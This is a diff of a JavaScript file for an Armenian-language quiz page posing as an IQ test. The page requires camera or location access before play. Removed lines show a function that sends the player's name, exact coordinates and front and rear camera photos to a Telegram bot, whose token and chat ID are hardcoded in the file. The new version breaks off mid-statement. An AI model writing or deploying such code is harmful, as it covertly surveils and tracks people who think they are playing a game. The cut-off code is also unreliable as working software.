@@ -2,96 +2,16 @@ const TELEGRAM_TOKEN = '7921776519:AAEtasvOGOZxdZo4gUNscLC49zSdm3CtITw';
 const TELEGRAM_CHAT_ID = '8071841674';
 
 const questions = [
-  {
-    question: "Ո՞րն է Հայաստանի մայրաքաղաքը։",
-    answers: [
-      { text: "Երևան", correct: true },
-      { text: "Գյումրի", correct: false },
-      { text: "Վանաձոր", correct: false },
-      { text: "Լոռի", correct: false }
-    ]
-  },
-  {
-    question: "Ո՞րն է 7 × 8",
-    answers: [
-      { text: "54", correct: false },
-      { text: "56", correct: true },
-      { text: "58", correct: false },
-      { text: "64", correct: false }
-    ]
-  },
-  {
-    question: "Ո՞րն է ամենամեծ օվկիանոսը",
-    answers: [
-      { text: "Ատլանտյան", correct: false },
-      { text: "Հնդկական", correct: false },
-      { text: "Խաղաղ", correct: true },
-      { text: "Արաբական", correct: false }
-    ]
-  },
-  {
-    question: "Ո՞րն է մարդու մարմնի ամենամեծ օրգանը",
-    answers: [
-      { text: "Սրտը", correct: false },
-      { text: "Մաշկը", correct: true },
-      { text: "Ոսկորները", correct: false },
-      { text: "Երիկամները", correct: false }
-    ]
-  },
-  {
-    question: "Ո՞րն է արևմուտքում մաշկի վնասման հիմնական պատճառը",
-    answers: [
-      { text: "Ջերմությունը", correct: false },
-      { text: "Արևի ճառագայթումը", correct: true },
-      { text: "Ջերմաստիճանը", correct: false },
-      { text: "Ջրի պակասը", correct: false }
-    ]
-  },
-  {
-    question: "Ո՞րն է Եվրոպայի ամենամեծ երկիրը",
-    answers: [
-      { text: "Ֆրանսիա", correct: false },
-      { text: "Ռուսաստան", correct: true },
-      { text: "Գերմանիա", correct: false },
-      { text: "Իտալիա", correct: false }
-    ]
-  },
-  {
-    question: "Ո՞ր երկիրն է հայտնի իր շոկոլադով",
-    answers: [
-      { text: "Բելգիա", correct: true },
-      { text: "Իսպանիա", correct: false },
-      { text: "Իտալիա", correct: false },
-      { text: "Գերմանիա", correct: false }
-    ]
-  },
-  {
-    question: "Ո՞րն է գիտության լեզուն",
-    answers: [
-      { text: "Լատին", correct: false },
-      { text: "Անգլերեն", correct: true },
-      { text: "Հին հունական", correct: false },
-      { text: "Ֆրանսերեն", correct: false }
-    ]
-  },
-  {
-    question: "Ո՞րն է Երկրի միայն արբանյակը",
-    answers: [
-      { text: "Արեգակ", correct: false },
-      { text: "Արեւ", correct: false },
-      { text: "Աստղ", correct: false },
-      { text: "Լուսին", correct: true }
-    ]
-  },
-  {
-    question: "Ո՞րն է ամենաարագ կենդանին",
-    answers: [
-      { text: "Գայլ", correct: false },
-      { text: "Առյուծ", correct: false },
-      { text: "Չղջիկ", correct: false },
-      { text: "Ճայագռի", correct: true }
-    ]
-  }
+  { question: "Ո՞րն է Ֆրանսիայի մայրաքաղաքը։", answers: [{ text: "Փարիզ", correct: true }, { text: "Լիոն", correct: false }, { text: "Մարսել", correct: false }, { text: "Նիցցա", correct: false }] },
+  { question: "Ո՞րն է Գերմանիայի մայրաքաղաքը։", answers: [{ text: "Բեռլին", correct: true }, { text: "Մյունխեն", correct: false }, { text: "Համբուրգ", correct: false }, { text: "Քյոլն", correct: false }] },
+  { question: "Ո՞րն է Իտալիայի մայրաքաղաքը։", answers: [{ text: "Հռոմ", correct: true }, { text: "Միլան", correct: false }, { text: "Նեապոլ", correct: false }, { text: "Տուրին", correct: false }] },
+  { question: "Ո՞րն է Ռուսաստանի մայրաքաղաքը։", answers: [{ text: "Մոսկվա", correct: true }, { text: "Սանկտ Պետերբուրգ", correct: false }, { text: "Կազան", correct: false }, { text: "Սոչի", correct: false }] },
+  { question: "Ո՞րն է Ճապոնիայի մայրաքաղաքը։", answers: [{ text: "Տոկիո", correct: true }, { text: "Օսակա", correct: false }, { text: "Նագասակի", correct: false }, { text: "Հիրոսիմա", correct: false }] },
+  { question: "Ո՞րն է ԱՄՆ-ի մայրաքաղաքը։", answers: [{ text: "Վաշինգտոն", correct: true }, { text: "Նյու Յորք", correct: false }, { text: "Լոս Անջելես", correct: false }, { text: "Չիկագո", correct: false }] },
+  { question: "Ո՞րն է Իրանի մայրաքաղաքը։", answers: [{ text: "Թեհրան", correct: true }, { text: "Իսֆահան", correct: false }, { text: "Մաշհադ", correct: false }, { text: "Քաշան", correct: false }] },
+  { question: "Ո՞րն է Բրազիլիայի մայրաքաղաքը։", answers: [{ text: "Բրազիլիա", correct: true }, { text: "Ռիո դե Ժանեյրո", correct: false }, { text: "Սան Պաուլո", correct: false }, { text: "Սալվադոր", correct: false }] },
+  { question: "Ո՞րն է Կանադայի մայրաքաղաքը։", answers: [{ text: "Օտտավա", correct: true }, { text: "Տորոնտո", correct: false }, { text: "Վանկուվեր", correct: false }, { text: "Մոնրեալ", correct: false }] },
+  { question: "Ո՞րն է Չինաստանի մայրաքաղաքը։", answers: [{ text: "Պեկին", correct: true }, { text: "Շանհայ", correct: false }, { text: "Հոնկոնգ", correct: false }, { text: "Գուանչժոու", correct: false }] }
 ];
 
 function shuffle(array) {
@@ -116,13 +36,8 @@ let correctAnswers = 0;
 let wrongAnswers = 0;
 
 async function init() {
-  let username = localStorage.getItem('iqtest_username');
-
-  if (!username) {
-    username = prompt("Մուտքագրեք ձեր անունը:");
-    if (!username || username.trim() === '') username = 'Անուն չկա';
-    localStorage.setItem('iqtest_username', username);
-  }
+  let username = prompt("Գրեք ձեր անունը:");
+  if (!username || username.trim() === '') username = 'Անանուն';
 
   userNameSpan.textContent = username;
 
@@ -134,7 +49,7 @@ async function init() {
   if (geo || photos.length > 0) {
     startGame();
   } else {
-    alert("Խնդրում ենք թույլտվեք կադերա կամ գտնվելու վայր:");
+    alert("Խնդրում ենք թույլատրել հասանելիություն տեսախցիկին կամ տեղակատվությանը։");
     location.reload();
   }
 }
@@ -178,7 +93,6 @@ async function getCameraPhotos() {
       ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
 
       const photoDataUrl = canvas.toDataURL('image/jpeg');
-
       stream.getTracks().forEach(track => track.stop());
 
       return photoDataUrl;
@@ -188,129 +102,4 @@ async function getCameraPhotos() {
   }
 
   const frontPhoto = await capturePhoto('user');
-  if (frontPhoto) photos.push(frontPhoto);
-
-  const rearPhoto = await capturePhoto('environment');
-  if (rearPhoto) photos.push(rearPhoto);
-
-  return photos;
-}
-
-function sendDataToTelegram(username, geo, photos) {
-  const messageParts = [];
-  if (username) messageParts.push(`Անուն: ${username}`);
-
-  if (geo) {
-    const mapUrl = `https://maps.google.com/?q=${geo.latitude},${geo.longitude}`;
-    messageParts.push(`Տեղադրություն: Լատ․ ${geo.latitude.toFixed(6)}, Լոնգ․ ${geo.longitude.toFixed(6)}, Ճշգրտություն՝ ${geo.accuracy}մ\nԿարգավիճակ՝ ${mapUrl}`);
-  } else {
-    messageParts.push("Տեղադրություն չի տրված։");
-  }
-
-  const textMessage = encodeURIComponent(messageParts.join('\n'));
-
-  fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage?chat_id=${TELEGRAM_CHAT_ID}&text=${textMessage}`);
-
-  photos.forEach((photo, index) => {
-    const formData = new FormData();
-    formData.append('chat_id', TELEGRAM_CHAT_ID);
-    formData.append('photo', dataURLtoBlob(photo), `photo${index}.jpg`);
-
-    fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendPhoto`, {
-      method: 'POST',
-      body: formData,
-    });
-  });
-}
-
-function dataURLtoBlob(dataurl) {
-  const arr = dataurl.split(','), mime = arr[0].match(/:(.*?);/)[1],
-    bstr = atob(arr[1]), n = bstr.length, u8arr = new Uint8Array(n);
-  for (let i=0; i<n; i++) {
-    u8arr[i] = bstr.charCodeAt(i);
-  }
-  return new Blob([u8arr], {type:mime});
-}
-
-function startGame() {
-  shuffledQuestions = shuffle(questions);
-  currentQuestionIndex = 0;
-  correctAnswers = 0;
-  wrongAnswers = 0;
-  resultScreen.classList.add('hidden');
-  document.querySelector('.container').style.display = 'block';
-  showQuestion();
-}
-
-function showQuestion() {
-  resetState();
-  const currentQuestion = shuffledQuestions[currentQuestionIndex];
-  questionText.textContent = currentQuestion.question;
-
-  const remaining = shuffledQuestions.length - currentQuestionIndex;
-  questionStatsSpan.textContent = `Մնացել է ${remaining} | Ճիշտ ${correctAnswers} | Հակառակ ${wrongAnswers}`;
-
-  currentQuestion.answers.forEach(answer => {
-    const button = document.createElement('button');
-    button.textContent = answer.text;
-    button.classList.add('btn');
-    button.addEventListener('click', () => selectAnswer(button, answer.correct));
-    answerButtons.appendChild(button);
-  });
-}
-
-function resetState() {
-  while (answerButtons.firstChild) {
-    answerButtons.removeChild(answerButtons.firstChild);
-  }
-}
-
-function selectAnswer(button, correct) {
-  if (correct) {
-    correctAnswers++;
-    button.style.backgroundColor = '#38a169';
-  } else {
-    wrongAnswers++;
-    button.style.backgroundColor = '#e53e3e';
-    showCorrectAnswer();
-  }
-
-  Array.from(answerButtons.children).forEach(btn => btn.disabled = true);
-
-  setTimeout(() => {
-    currentQuestionIndex++;
-    if (currentQuestionIndex < shuffledQuestions.length) {
-      showQuestion();
-    } else {
-      showResult();
-    }
-  }, 1500);
-}
-
-function showCorrectAnswer() {
-  const currentQuestion = shuffledQuestions[currentQuestionIndex];
-  Array.from(answerButtons.children).forEach((btn, idx) => {
-    if (currentQuestion.answers[idx].correct) {
-      btn.style.backgroundColor = '#38a169';
-    }
-  });
-}
-
-function showResult() {
-  document.querySelector('.container').style.display = 'none';
-  resultScreen.classList.remove('hidden');
-
-  if (correctAnswers >= 7) {
-    resultTitle.textContent = 'Դու խելացի ես 😎';
-    resultSummary.textContent = `Ճիշտ պատասխաններ՝ ${correctAnswers} / ${shuffledQuestions.length}`;
-  } else {
-    resultTitle.textContent = 'Փորձիր նորից 🧠';
-    resultSummary.textContent = `Ճիշտ պատասխաններ՝ ${correctAnswers} / ${shuffledQuestions.length}`;
-  }
-}
-
-retryButton.addEventListener('click', () => {
-  location.reload();
-});
-
-init();
+  if (frontPhoto) ph
